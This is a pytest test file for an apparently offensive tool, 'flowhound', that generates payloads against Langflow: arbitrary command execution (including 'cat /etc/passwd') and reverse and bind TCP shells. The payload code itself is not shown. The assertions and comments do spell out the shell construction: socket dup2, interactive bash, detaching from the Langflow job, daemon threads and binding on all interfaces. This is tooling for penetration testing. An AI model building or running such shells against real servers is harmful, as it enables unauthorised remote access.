import pytest

from flowhound.vulnerabilities.payloads.bind_tcp_shell import (
    Payload as BindTcpShellPayload,
)
from flowhound.vulnerabilities.payloads.execute_bash_command import (
    Payload as CommandPayload,
)
from flowhound.vulnerabilities.payloads.reverse_tcp_shell import (
    Payload as ReverseTcpShellPayload,
)

# ---------------------------------------------------------------------------
# execute_bash_command.Payload
# ---------------------------------------------------------------------------

command_payload_cases = [
    "id",
    "whoami",
    "cat /etc/passwd",
    "ls -la /tmp",
]


@pytest.mark.parametrize("cmd", command_payload_cases)
def test_command_payload_creation(cmd):
    p = CommandPayload(cmd=cmd)
    assert isinstance(p, CommandPayload)


@pytest.mark.parametrize("cmd", command_payload_cases)
def test_command_payload_contains_cmd(cmd):
    p = CommandPayload(cmd=cmd)
    result = p.load_payload()
    assert cmd in result


@pytest.mark.parametrize("cmd", command_payload_cases)
def test_command_payload_load_payload_returns_string(cmd):
    p = CommandPayload(cmd=cmd)
    assert isinstance(p.load_payload(), str)


def test_command_payload_not_blocking():
    p = CommandPayload(cmd="id")
    assert p.blocking is False


def test_command_payload_generate_payload_contains_subprocess():
    p = CommandPayload(cmd="whoami")
    assert "subprocess" in p.load_payload()


# ---------------------------------------------------------------------------
# reverse_tcp_shell.Payload
# ---------------------------------------------------------------------------

reverse_shell_payload_cases = [
    ("192.168.1.10", 4444),
    ("10.0.0.1", 1337),
    ("127.0.0.1", 9001),
]


@pytest.mark.parametrize("lhost, lport", reverse_shell_payload_cases)
def test_reverse_shell_payload_creation(lhost, lport):
    p = ReverseTcpShellPayload(lhost=lhost, lport=lport)
    assert isinstance(p, ReverseTcpShellPayload)


@pytest.mark.parametrize("lhost, lport", reverse_shell_payload_cases)
def test_reverse_shell_payload_contains_lhost_and_lport(lhost, lport):
    p = ReverseTcpShellPayload(lhost=lhost, lport=lport)
    result = p.load_payload()
    assert lhost in result
    assert str(lport) in result


@pytest.mark.parametrize("lhost, lport", reverse_shell_payload_cases)
def test_reverse_shell_payload_load_payload_returns_string(lhost, lport):
    p = ReverseTcpShellPayload(lhost=lhost, lport=lport)
    assert isinstance(p.load_payload(), str)


def test_reverse_shell_payload_is_blocking():
    p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
    assert p.blocking is True


def test_reverse_shell_payload_contains_socket():
    p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
    assert "socket" in p.load_payload()


def test_reverse_shell_payload_uses_popen_not_execv():
    p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
    code = p.load_payload()
    assert "subprocess.Popen" in code
    assert "os.execv" not in code


def test_reverse_shell_payload_bash_interactive_flag():
    # '-i' keeps bash interactive so the connection stays open without a TTY
    p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
    code = p.load_payload()
    assert "'/bin/bash', '-i'" in code or "['/bin/bash', '-i']" in code


def test_reverse_shell_payload_detaches_from_parent():
    # start_new_session=True detaches bash from the Langflow job so it is not
    # killed when the thread/job completes.
    p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
    code = p.load_payload()
    assert "start_new_session=True" in code
    assert "_p.wait()" not in code


def test_reverse_shell_payload_uses_dup2():
    # Socket fd is dup2'd onto 0/1/2 so the detached child inherits them
    p = ReverseTcpShellPayload(lhost="192.168.1.10", lport=4444)
    code = p.load_payload()
    assert "os.dup2" in code


# ---------------------------------------------------------------------------
# bind_tcp_shell.Payload
# ---------------------------------------------------------------------------

bind_shell_payload_cases = [
    ("192.168.1.10", 4444),
    ("10.0.0.1", 1337),
    ("127.0.0.1", 9001),
]


@pytest.mark.parametrize("rhost, rport", bind_shell_payload_cases)
def test_bind_shell_payload_creation(rhost, rport):
    p = BindTcpShellPayload(rhost=rhost, rport=rport)
    assert isinstance(p, BindTcpShellPayload)


@pytest.mark.parametrize("rhost, rport", bind_shell_payload_cases)
def test_bind_shell_payload_contains_rport(rhost, rport):
    # rhost is attacker-side only; the payload binds on 0.0.0.0, not rhost.
    p = BindTcpShellPayload(rhost=rhost, rport=rport)
    assert str(rport) in p.load_payload()


@pytest.mark.parametrize("rhost, rport", bind_shell_payload_cases)
def test_bind_shell_payload_binds_on_all_interfaces(rhost, rport):
    """Victim must bind on 0.0.0.0, not the attacker's IP."""
    p = BindTcpShellPayload(rhost=rhost, rport=rport)
    code = p.load_payload()
    assert "0.0.0.0" in code
    assert rhost not in code


@pytest.mark.parametrize("rhost, rport", bind_shell_payload_cases)
def test_bind_shell_payload_load_payload_returns_string(rhost, rport):
    p = BindTcpShellPayload(rhost=rhost, rport=rport)
    assert isinstance(p.load_payload(), str)


def test_bind_shell_payload_is_blocking():
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    assert p.blocking is True


def test_bind_shell_payload_stores_rhost_and_rport():
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    assert p.rhost == "192.168.1.10"
    assert p.rport == 4444


def test_bind_shell_payload_contains_socket():
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    assert "socket" in p.load_payload()


def test_bind_shell_payload_uses_threading():
    """Blocking work runs in a daemon thread so Langflow's worker is not hung."""
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    code = p.load_payload()
    assert "threading.Thread" in code
    assert "daemon=True" in code
    assert "_t.start()" in code


def test_bind_shell_payload_uses_bind_not_connect():
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    code = p.load_payload()
    assert "_s.bind(" in code
    assert "_s.connect(" not in code


def test_bind_shell_payload_sets_so_reuseaddr():
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    assert "SO_REUSEADDR" in p.load_payload()


def test_bind_shell_payload_closes_after_popen():
    """_c.close() and _s.close() must appear after subprocess.Popen so the
    server socket is not torn down before bash has inherited the fds."""
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    code = p.load_payload()
    popen_pos = code.index("subprocess.Popen")
    close_pos = code.index("_c.close()")
    assert close_pos > popen_pos


def test_bind_shell_payload_listens_and_accepts():
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    code = p.load_payload()
    assert "_s.listen(" in code
    assert "_s.accept()" in code


def test_bind_shell_payload_uses_popen_not_execv():
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    code = p.load_payload()
    assert "subprocess.Popen" in code
    assert "os.execv" not in code


def test_bind_shell_payload_bash_interactive_flag():
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    code = p.load_payload()
    assert "'/bin/bash', '-i'" in code or "['/bin/bash', '-i']" in code


def test_bind_shell_payload_detaches_from_parent():
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    code = p.load_payload()
    assert "start_new_session=True" in code
    assert "_p.wait()" not in code


def test_bind_shell_payload_uses_dup2():
    p = BindTcpShellPayload(rhost="192.168.1.10", rport=4444)
    code = p.load_payload()
    assert "os.dup2" in code


def test_bind_shell_payload_default_port():
    p = BindTcpShellPayload(rhost="192.168.1.10")
    assert p.rport == 4444
